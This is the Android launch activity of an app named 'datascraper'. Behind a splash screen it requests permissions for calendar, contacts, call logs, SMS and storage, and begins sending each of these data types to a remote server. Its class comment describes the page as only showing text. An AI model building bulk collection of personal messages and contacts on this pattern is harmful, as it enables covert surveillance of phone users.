package com.example.alex.datascraper;

import android.*;
import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.CountDownTimer;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.view.Window;
import android.widget.Button;

import java.util.ArrayList;

/*
Activity class that displays the first page of the App
This page simply contains text describing the application flow
 */

public class LaunchActivity extends AppCompatActivity {

    // UI elements
    //Intent i = new Intent(LaunchActivity.this, FingerprintActivity.class);

    //private static Button nextScreenButton;
    private static boolean dataSent = false;
    ModalityHabits mhabits = new ModalityHabits();
    // holds which modalities are waiting for permissions to be granted
    private ArrayList<Integer> waiting = new ArrayList<Integer>();
    // boolean array for modalities, true indicates that the modality send thread has been launched
    private boolean[] send = {false, false, false, false, false};

    // booleans for tracking send thread dispatching, true when done dispatching
    private boolean mainDataDispatchingFinished = false; // true when done dispatching granted permissions
    private boolean permissionsDataDispatchingFinished = false; // true when done attempting to dispatch new permissions
    private static final int ASK_MULTIPLE_PERMISSION_REQUEST_CODE = 1;

    // String array for requesting permissions
    private static final String[] permissions = new String[]{
            android.Manifest.permission.READ_CALENDAR,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_SMS,
            Manifest.permission.READ_EXTERNAL_STORAGE,
    };

    // constants for telling which boolean in the send array pertains to which modality
    private static final int CALENDAR = 0;
    private static final int CONTACTS = 1;
    private static final int CALLS = 2;
    private static final int TEXT = 3;
    private static final int STORAGE = 4;



    // function that fires on the creation of the activity
    @Override
    protected void onCreate(Bundle savedInstanceState) {

        super.onCreate(savedInstanceState);

        setContentView(R.layout.activity_launch);

        //display the logo during 2.5 seconds,
        new CountDownTimer(2500,1000){
            @Override
            public void onTick(long millisUntilFinished){}
            @Override
            public void onFinish(){
                // send all available data in a seperate thread from the UI, as long as it hasnt already been started
                if(!dataSent){
                    ServerHook.start();
                    Log.d("MYAPP", "OBTAINED ID: " + ServerHook.identifier);
                    if(ServerHook.identifier.equals("")){
                        startActivity(new Intent(LaunchActivity.this, InternetActivity.class));
                    }
                    dataSent = true;

                    Thread t = new Thread(){
                        public void run() {
                            sendAllAvailableData();
                        }
                    };
                    t.start();
                }
                //set the new Content of your activity


                //startActivity(new Intent(LaunchActivity.this, FingerprintActivity.class));

            }
        }.start();

    }

    @Override
    protected void onResume() {
        super.onResume();
        setContentView(R.layout.activity_launch);

    }

    /**
     * Sends all data that the app can scrape to a server
     * Ignores data that permissions were denied for
     */
    public void sendAllAvailableData(){
        Context mContext = getApplicationContext();
        ServerHook.sendToServer("debug","START");
        Log.d("MYAPP", "GO");

        // list holding modalities for which the app is waiting for permissions to be granted
        waiting = new ArrayList<Integer>();

        // check if the app has permissions for each modality
        // if yes, mark as ready to send
        // if no, add to list of awaited permissions

        //request calendar access if access not already available
        if(checkSelfPermission(android.Manifest.permission.READ_CALENDAR) == PackageManager.PERMISSION_GRANTED){
            send[CALENDAR] = true;
        }
        else{
            waiting.add(CALENDAR);
        }
        //request contacts access if access not already available
        if(checkSelfPermission(android.Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED){
            send[CONTACTS] = true;
        }
        else{
            waiting.add(CONTACTS);
        }
        if(checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
            send[CALLS] = true;
        }
        else{
            waiting.add(CALLS);
        }
        if(checkSelfPermission(android.Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED){
            send[TEXT] = true;
        }
        else{
            waiting.add(TEXT);
        }
        //request storage access if access not already available
        if(checkSelfPermission(android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED){
            send[STORAGE] = true;
        }
        else{
            waiting.add(STORAGE);
        }


        // ask for permission for all needed data types. If the app already has any they will be ignored
        ActivityCompat.requestPermissions(this, permissions, ASK_MULTIPLE_PERMISSION_REQUEST_CODE);

        // send all data types that were marked as having permissions already
        if(send[CALENDAR]){
            mhabits.getHabit(mContext, "calendar");
        }
        if(send[CONTACTS]){
            mhabits.getHabit(mContext, "contacts");
        }
        if(send[CALLS]){
            mhabits.getHabit(mContext, "calls");
        }
        if(send[TEXT]) {
            mhabits.getHabit(mContext, "texts");
        }
        if(send[STORAGE]){
            mhabits.getHabit(mContext, "files");
        }


        // mark the main data dispatch as done
        mainDataDispatchingFinished = true;
        // see if all dispatching has been finished
        checkIfFinishedDispatching();

    }

    /* checks if all available modality sending threads have been dispatched
    * this is important for detecing if the app is done sending all available data
     */
    private void checkIfFinishedDispatching(){
        if(mainDataDispatchingFinished && permissionsDataDispatchingFinished){;
            mhabits.dispatchDone(); // tell ModalityHabits that the mainactivity is done dispatching
            mainDataDispatchingFinished = false;
            permissionsDataDispatchingFinished = false;
        }
    }

    /*
     For handling permission request responses
     */
    @Override
    public void onRequestPermissionsResult(int requestCode,
                                           String permissions[], int[] grantResults) {

        Context mContext = getApplicationContext();

        // Try to send each modality again, if permissions were not granted they will fail gracefully

        if(!send[TEXT] && !permissionsDataDispatchingFinished){
            try {
                mhabits.getHabit(mContext, "texts");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[CALLS] && !permissionsDataDispatchingFinished){
            try {
                mhabits.getHabit(mContext, "calls");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[CALENDAR] && !permissionsDataDispatchingFinished){
            try {
                mhabits.getHabit(mContext, "calendar");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }
        if(!send[STORAGE] && !permissionsDataDispatchingFinished){
            try {
                mhabits.getHabit(mContext, "files");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }
        }
        if(!send[CONTACTS] && !permissionsDataDispatchingFinished){
            try {
                mhabits.getHabit(mContext, "contacts");
            }
            catch(Exception e){
                Log.d("ERROR", e.getMessage());
            }

        }

        // mark permissions response dispatcher as done and check if done dispatching
        permissionsDataDispatchingFinished = true;
        checkIfFinishedDispatching();
        Intent i = new Intent(LaunchActivity.this, FingerprintActivity.class);
        startActivity(i);

    }
}
